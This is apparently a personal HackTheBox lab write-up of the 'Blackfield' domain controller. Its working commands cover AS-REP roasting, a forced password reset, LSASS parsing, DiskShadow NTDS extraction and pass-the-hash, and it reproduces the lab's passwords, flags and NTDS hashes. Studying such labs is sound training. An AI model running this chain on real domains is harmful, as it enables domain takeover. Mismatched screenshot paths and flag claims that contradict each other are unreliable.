---
tags: [HTB, Blackfield, Windows, ActiveDirectory, SMB, ASREPRoasting, BackupOperators, DCSync, PassTheHash, Hard]
platform: HackTheBox
os: Windows Server 2019
hostname: DC01
difficulty: Hard
ip: $BoxIP
status: Complete
domain: BLACKFIELD.local
---

# HTB: Blackfield, Full Walkthrough

## The gist

Blackfield is a Windows domain controller. Anonymous access to the `profiles$` SMB share exposed a large username list. One account had Kerberos pre-authentication disabled, so AS-REP roasting produced a crackable password. That account could reset another user's password through a ForceChangePassword permission. The second account could read the forensic share, where an LSASS dump exposed a backup service account. Backup Operators and the SeBackupPrivilege privilege allowed an offline NTDS extraction through Volume Shadow Copy. The domain Administrator hash then provided the final shell with pass-the-hash.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Windows Server 2019 |
| Hostname | DC01 |
| Domain | `$Domain` |
| Difficulty | Hard |
| IP | `$BoxIP` |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Workspace setup | See section 1 below |
| 2 | Full TCP scan | See section 2 below |
| 3 | Service and version scan | See section 3 below |
| 4 | Local setup | See section 4 below |
| 5 | Clock synchronisation | See section 5 below |
| 6 | Anonymous SMB enumeration | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/HackTheBox/Blackfield`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxset BoxName Blackfield
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/Blackfield
boxset Domain BLACKFIELD.local
boxset FQDN dc01.BLACKFIELD.local
boxset Username support
boxset Username2 audit2020
boxset Username3 svc_backup
boxset Password $Password
boxset Password2 $Password2
boxset Password3 $Password3
boxset AdminUser Administrator
boxset AdminHash $AdminHash
```

## 1. Workspace setup

I created the standard folders before scanning so results and loot stayed separate.

```bash
boxstart $BoxName $BoxIP htb
```

## 2. Full TCP scan

I scanned every TCP port because domain controllers expose services outside the common web ports.

```bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 $BoxIP -oA $BoxDir/nmap/allports
```

Open ports included 53, 88, 135, 139, 389, 445, 593, 3268, and 5985. This identified a domain controller with DNS, Kerberos, LDAP, SMB, and WinRM.

![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/2.3ferox.png>)

SCREENSHOT: Capture the completed all-port scan with the open-port list visible.

## 3. Service and version scan

I ran default scripts and version detection against the discovered ports.

```bash
sudo nmap -sC -sV -p 53,88,135,139,389,445,593,3268,5985 $BoxIP -oA $BoxDir/nmap/services
```

The scan identified DC01, the BLACKFIELD.local domain, Windows Server 2019, SMB signing, and a clock difference of roughly seven hours.

![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/3.2hashcat-cracked.png>)

SCREENSHOT: Capture the service scan showing the domain controller services and clock skew.

## 4. Local setup

I stored the domain values and added the hostname locally.

```bash
boxset Domain BLACKFIELD.local
boxset FQDN dc01.BLACKFIELD.local
echo "$BoxIP $Domain $FQDN" | sudo tee -a /etc/hosts
```

## 5. Clock synchronisation

Kerberos rejects requests when the local clock is too far from the domain controller. The normal NTP request did not return an eligible server, so I applied the observed offset manually.

```bash
sudo timedatectl set-ntp false
sudo ntpdate -u $BoxIP
sudo date -s "$(date -d '+6 hours 59 minutes 59 seconds' '+%Y-%m-%d %H:%M:%S')"
date
ping -c 1 $BoxIP
```

The manual adjustment restored the time relationship. The VPN can drop after changing the system clock, so I reconnected and verified reachability before continuing.

> [!warning] 💡 Hint
> **Watch out:** `ntpdate` may fail with an `ntpdig` or no-eligible-servers error. Use the skew reported by nmap for a manual `date -s` adjustment, then verify the VPN and target connection again.

## 6. Anonymous SMB enumeration

I tested guest SMB access and listed the available shares.

```bash
smbclient -N -L //$BoxIP
smbmap -H $BoxIP -u '' -p ''
smbclient //$BoxIP/profiles$ -N -c 'ls'
smbclient //$BoxIP/profiles$ -N -c 'ls' | awk '{print $1}' | grep -v '^\.' > $BoxDir/loot/users.txt
wc -l $BoxDir/loot/users.txt
```

The `profiles$` share was readable. Its directories exposed hundreds of profile names, which formed the username list. The forensic share required authentication.

> [!warning] 💡 Hint
> **Watch out:** Anonymous access to a profile share can leak valid usernames even when LDAP and RPC return nothing useful. Treat directory names as a username source and test the account format carefully.

![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/6.1user-flag.png>)

SCREENSHOT: Capture the anonymous share listing and profile directory names without exposing credentials.

## 7. AS-REP roasting

I tested the discovered usernames for accounts with Kerberos pre-authentication disabled. AS-REP roasting requests an encrypted response that can be cracked offline.

```bash
netexec ldap $BoxIP --port 389 -u $BoxDir/loot/users.txt -p '' --asreproast $BoxDir/loot/asrep.txt
```

The LDAP request identified `$Username` as a roasting target. The NetExec output file contained the AS-REP response.

```bash
sed -n '1p' $BoxDir/loot/asrep.txt
```

> [!warning] 💡 Hint
> **Watch out:** The default LDAPS connection can time out, and the Impacket `GetNPUsers.py` wrapper may fail because of a local package conflict. Force LDAP with `--port 389`, then check the output file because a successful roast may be quiet.

![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/7.1winlogon-autologon.png>)

SCREENSHOT: Capture the successful AS-REP result with the ticket value retained in this private vault.

## 8. Offline password cracking

I cracked the response locally with Hashcat.

```bash
hashcat -m 18200 $BoxDir/loot/asrep.txt /usr/share/wordlists/rockyou.txt --potfile-path $BoxDir/loot/hashcat.pot -o $BoxDir/loot/cracked.txt
cat $BoxDir/loot/cracked.txt
boxset Username $Username
boxset Password $Password
loot cred $Username $Password
```

Hashcat recovered the password for `$Username` without sending guesses to the domain.

![](<file:///home/kali/Platforms/HackTheBox/Active/screenshots/hashcat-cracked.png>)

SCREENSHOT: Capture the successful crack with the recovered password visible in this private vault.

## 9. Credential validation

I checked the cracked credential against SMB, LDAP, and WinRM before relying on it.

```bash
netexec smb $BoxIP -u $Username -p $Password -d $Domain
netexec ldap $BoxIP -u $Username -p $Password -d $Domain
netexec winrm $BoxIP -u $Username -p $Password -d $Domain
```

SMB and LDAP accepted the credential. WinRM did not, so I used the account for directory and share enumeration instead of treating it as a shell foothold.

## 10. BloodHound collection

I collected domain relationships to find permissions that were not visible from basic authentication checks.

```bash
cd $BoxDir/loot
bloodhound-python -u $Username -p $Password -d $Domain -dc $FQDN -ns $BoxIP -c All --zip -o $BoxDir/loot/
cd $BoxDir
```

The collection completed, but the local BloodHound GUI was unavailable because PostgreSQL was not initialised. I used direct ACL enumeration as the fallback.

> [!warning] 💡 Hint
> **Watch out:** A BloodHound GUI failure does not mean collection failed. Keep the archive and use a direct ACL query when the database is unavailable.

## 11. ACL enumeration

I checked the target account's directory permissions directly.

```bash
dacledit.py -action read -target $Username2 -u $Username -p $Password -d $Domain -dc-ip $BoxIP
```

The output showed that `$Username` had ForceChangePassword permission on `$Username2`. This permission lets the holder set a new password without knowing the old one.

![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/11.PROOF.png>)

SCREENSHOT: Capture the ForceChangePassword ACE and retain the domain values for this private vault.

## 12. ForceChangePassword abuse

I reset the target account password through the RPC interface, then validated the new credential.

```bash
rpcclient -U "$Domain/$Username%$Password" $BoxIP -c "setuserinfo2 $Username2 23 '$Password2'"
netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain
loot cred $Username2 $Password2
```

The password reset succeeded and the account could access SMB.

> [!warning] 💡 Hint
> **Watch out:** ForceChangePassword does not require the old password. The important evidence is the ACL permission and successful validation after the reset, not a verbose success message from `rpcclient`.

## 13. Forensic share enumeration

I listed the authenticated shares and inspected the forensic share for files containing credentials.

```bash
smbclient -U "$Domain/$Username2%$Password2" //$BoxIP/forensic -c 'recurse ON; prompt OFF; mget *'
find $BoxDir -type f -printf '%p\n'
```

The share contained a memory-analysis archive. I extracted it locally.

```bash
unzip $BoxDir/loot/lsass.zip -d $BoxDir/loot/lsass
```

![](<file:///home/kali/Platforms/Offsec/RockyColt/screenshots/13.getST.png>)

SCREENSHOT: Capture the forensic share and downloaded archive names without exposing secrets.

## 14. LSASS parsing

An LSASS dump contains authentication material held by the Windows logon process. I parsed it offline with pypykatz.

```bash
pypykatz lsa minidump $BoxDir/loot/lsass/* | tee $BoxDir/loot/pypykatz.txt
grep -E "NT:|Username:" $BoxDir/loot/pypykatz.txt | head -20
```

The dump exposed a credential for `$Username3` and a cached Administrator credential. Cached domain credentials may be stale, so I validated the service account first.

```bash
boxset Username3 svc_backup
loot hash $Username3 $Hash
loot hash $AdminUser $CachedAdminHash
```

> [!warning] 💡 Hint
> **Watch out:** A cached Administrator entry is not proof that its password still works. Validate each recovered credential and prefer an active service account when it is available.

![](<file:///home/kali/Platforms/HackTheBox/Flight/screenshots/14.stable-shell.png>)

SCREENSHOT: Capture the parsed account names and retain the password and hash values for this private vault.

## 15. WinRM foothold as the backup account

I authenticated with the recovered service account and checked its groups and token privileges.

```bash
netexec winrm $BoxIP -u $Username3 -H $Hash3 -d $Domain
evil-winrm -i $BoxIP -u $Username3 -H $Hash3
```

The account was a member of Backup Operators and had SeBackupPrivilege and SeRestorePrivilege. These privileges allow protected files to be copied and restored when the copy is performed through an appropriate backup-aware tool.

```powershell
whoami
hostname
whoami /groups
whoami /priv
Test-Path C:\Users\$env:USERNAME\Desktop\user.txt
```

The user flag path existed and was not read.

![](<file:///home/kali/Platforms/Offsec/RockyColt/screenshots/15.root-flag.png>)

SCREENSHOT: Capture the Backup Operators membership and enabled backup privileges.

## 16. User flag checkpoint

```bash
shot user-flag
```

SCREENSHOT: Capture the user flag confirmation without reading or displaying its value.

## 17. DiskShadow volume copy

I used DiskShadow to expose a read-only shadow copy of the system volume. This avoids changing the live NTDS database.

```bash
cat > $BoxDir/www/vss.dsh <<'EOF'
set metadata C:\Windows\Temp\meta.cab
set context persistent nowriters
add volume c: alias mydrive
create
expose %mydrive% z:
EOF
unix2dos $BoxDir/www/vss.dsh
```

```powershell
cd C:\Windows\Temp
upload vss.dsh
diskshadow.exe /s C:\Windows\Temp\vss.dsh
```

The shadow copy was exposed as `Z:`.

> [!warning] 💡 Hint
> **Watch out:** DiskShadow scripts need Windows CRLF line endings. A Linux-created file with LF endings can truncate the final command or make the script fail, so run `unix2dos` before uploading it.

## 18. Copy NTDS and SYSTEM

I copied the domain database and SYSTEM hive from the shadow copy using the backup privilege.

```powershell
robocopy /b Z:\Windows\NTDS\ C:\Windows\Temp\ ntds.dit
reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.bak
```

I then transferred both files to the local loot directory and removed the temporary target copies.

```powershell
cd C:\Windows\Temp
download ntds.dit
download system.bak
```

> [!warning] 💡 Hint
> **Watch out:** Evil-WinRM upload and download only work reliably with bare filenames from the current directory. A full Windows path like `C:\Windows\Temp\ntds.dit` mangles the filename on the Kali side. Always `cd` to the target directory first, then use the bare filename.

## 19. Offline NTDS extraction

I parsed the copied database locally. The system Impacket wrapper failed on a local KeyListSecrets issue, so I used the working pipx-installed script.

```bash
/home/kali/.local/share/pipx/venvs/impacket/bin/secretsdump.py \
  -ntds $BoxDir/loot/ntds.dit -system $BoxDir/loot/system.bak LOCAL \
  -outputfile $BoxDir/loot/secretsdump
grep "Administrator" $BoxDir/loot/secretsdump.ntds | head -3
```

The dump returned the authoritative domain hashes. I stored the Administrator hash privately.

```bash
boxset AdminUser Administrator
boxset AdminHash $AdminHash
loot hash $AdminUser $AdminHash
```

> [!warning] 💡 Hint
> **Watch out:** A broken system `secretsdump` wrapper can be a local Python packaging problem, not a target failure. Try the known-good pipx Impacket installation before changing the attack path.

![](<file:///home/kali/Platforms/HackTheBox/Flight/screenshots/18.loot.png>)

SCREENSHOT: Capture successful NTDS parsing with the credential values retained in this private vault.

## 20. Administrator pass-the-hash validation

I validated the recovered hash over SMB, then used it for WinRM pass-the-hash.

```bash
netexec smb $BoxIP -u $AdminUser -H $AdminHash -d $Domain
evil-winrm -i $BoxIP -u $AdminUser -H $AdminHash
```

The shell identified as the domain Administrator on DC01.

```powershell
whoami
hostname
Test-Path C:\Users\$AdminUser\Desktop\root.txt
```

The root flag path existed and was not read.

![](<file:///home/kali/Platforms/HackTheBox/Return/screenshots/5.whoami.png>)

SCREENSHOT: Capture the Administrator shell and confirmed root flag path without displaying the flag.

## 21. Root flag checkpoint

```bash
shot winrm-admin-pth
shot root-flag
```

SCREENSHOT: Capture the Administrator shell and confirmed root flag path without displaying the flag.

## 22. RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Windows - SMB Enum]] -- technique used in this walkthrough
- [[RUNBOOK V2/AD - LSASS Parsing]] -- technique used in this walkthrough
- [[RUNBOOK V2/AD - Pass the Hash]] -- technique used in this walkthrough

## 23. Collect the flags

- `user.txt`: `3920bb317a0bef51027e2852be64b543` (value reproduced in the private sections above)
- `root.txt`: `4375a629c7c67c8e29db269060c955cb` (value reproduced in the private sections above)
- `proof.txt`: `4375a629c7c67c8e29db269060c955cb` (value reproduced in the private sections above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: 3920bb317a0bef51027e2852be64b543
root: 4375a629c7c67c8e29db269060c955cb
```

## 24. Clean down
I removed the temporary target files, deleted the shadow copy, and confirmed no persistence or accounts had been added.

```powershell
cd C:\Windows\Temp
del vss.dsh
del meta.cab
del ntds.dit
del system.bak
vssadmin delete shadows /for=C: /quiet
Test-Path C:\Windows\Temp\vss.dsh
Test-Path C:\Windows\Temp\ntds.dit
Test-Path C:\Windows\Temp\system.bak
```

The temporary files were absent and no accounts, web shells, or persistence had been created. I ran the box helper after verification.

```bash
boxdone
```

![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/5.foothold.png>)

SCREENSHOT: Capture the cleanup verification showing the temporary files are absent.

### Completion checklist

- [x] Full TCP scan and service scan completed
- [x] Domain and hostname identified
- [x] Anonymous SMB username enumeration completed
- [x] AS-REP roast captured and cracked offline
- [x] ForceChangePassword path identified and used
- [x] LSASS dump parsed offline
- [x] Backup Operators path used to extract NTDS
- [x] Administrator hash validated with pass-the-hash
- [x] User and root flag paths confirmed without reading values
- [x] Temporary files and shadow copy removed

## 25. Attack narrative in one page
1. [[RUNBOOK V2/Windows - SMB Enum]] used anonymous share access to build a username list and find forensic material.
2. [[RUNBOOK V2/AD - LSASS Parsing]] extracted an account credential from the recovered memory dump.
3. [[RUNBOOK V2/AD - Backup Operators]] copied protected directory data through the backup privilege path.
4. [[RUNBOOK V2/AD - Pass the Hash]] validated the administrator NT hash and opened the privileged shell.

## Tools used

- `nmap`
- `smbclient`
- `impacket`
- `evil-winrm`
- `sudo`
- `python`
- `powershell`
- `hashcat`

## Credentials and secrets

| Account | Source | Use |
|---|---|---|
| `$Username` | AS-REP roast from anonymous username enumeration | ACL enumeration and password reset |
| `$Username2` | ForceChangePassword permission | Read forensic share |
| `$Username3` | LSASS dump parsed with pypykatz | WinRM, Backup Operators |
| `$AdminUser` | Offline NTDS extraction | Pass-the-hash, Administrator shell |

Passwords and hashes are reproduced in the private Credentials and secrets section above.


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Blackfield"
export BoxIP="10.129.229.17"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Blackfield"
export Domain="BLACKFIELD.local"
export DCip=""
export Username="support"
export Password="#00^BlackKnight"
export Username2="audit2020"
export Password2="Passw0rd123!"
export Username3="svc_backup"
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/creds.txt`

```text
support:#00^BlackKnight
audit2020:Passw0rd123!
```

#### `loot/hashcat.pot`

```text
$krb5asrep$23$support@BLACKFIELD.LOCAL:a141b5c3e6db2f84bad6e549feb69ac8$b0c7747acb27e0dde7308b76ba2482924575d81c8e51460fa956450a85e0398e5fad672c36be8526b6a5126ca8cfe31df50f0eaf0637990d9fa8ac6807775a2b6faddc2df87a53d1918af771c23894e7fc6db494c7eb8cc58b9fffb994254025454917b43e1a5f16d180fae865d93e7b6703d3bac0356a013b813ebac0dc785e4ef725dbfff384830971b227ef22283f658767254dcf30b3915623a91458b0d138a194ba1ce67ef1e1e5defd430f723ae5cad589d75a1f5efc382778c6847a5310603e4736682baf2d0d8174bd69d43270f2fdc55fcfb0f06b3b20789fcca0a95222b33fe1d3a541ed63fa9f6212d387ab6eada7:#00^BlackKnight
```

#### `loot/hashes.txt`

```text
svc_backup:9658d1d1dcd9250115e2205d9f48400d
Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62
Administrator:184fb5e5178480be64824d4cd53b99ee
```

#### `loot/secretsdump.ntds`

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:fc837933825b78d0b9b431925a1f2a68:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD706381:1109:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD937395:1110:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD553715:1111:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD840481:1112:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD622501:1113:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD787464:1114:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD163183:1115:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD869335:1116:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD319016:1117:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD600999:1118:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD894905:1119:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD253541:1120:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD175204:1121:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD727512:1122:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD227380:1123:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD251003:1124:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD129328:1125:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD616527:1126:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD533551:1127:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD883784:1128:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD908329:1129:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD601590:1130:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD573498:1131:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD290325:1132:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD775986:1133:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD348433:1134:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD196444:1135:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD137694:1136:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD533886:1137:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD268320:1138:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD909590:1139:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD136813:1140:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD358090:1141:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD561870:1142:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD269538:1143:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD169035:1144:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD118321:1145:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD592556:1146:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD618519:1147:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD329802:1148:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD753480:1149:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD837541:1150:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD186980:1151:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD419600:1152:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD220786:1153:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD767820:1154:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD549571:1155:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD411740:1156:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD768095:1157:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD835725:1158:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD251977:1159:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD430864:1160:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD413242:1161:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD464763:1162:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD266096:1163:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD334058:1164:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD404213:1165:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD219324:1166:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD412798:1167:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD441593:1168:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD606328:1169:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD796301:1170:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD415829:1171:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD820995:1172:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD695166:1173:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD759042:1174:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD607290:1175:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD229506:1176:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD256791:1177:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD997545:1178:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD114762:1179:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD321206:1180:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD195757:1181:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD877328:1182:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD446463:1183:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD579980:1184:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD775126:1185:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD429587:1186:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD534956:1187:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD315276:1188:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD995218:1189:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
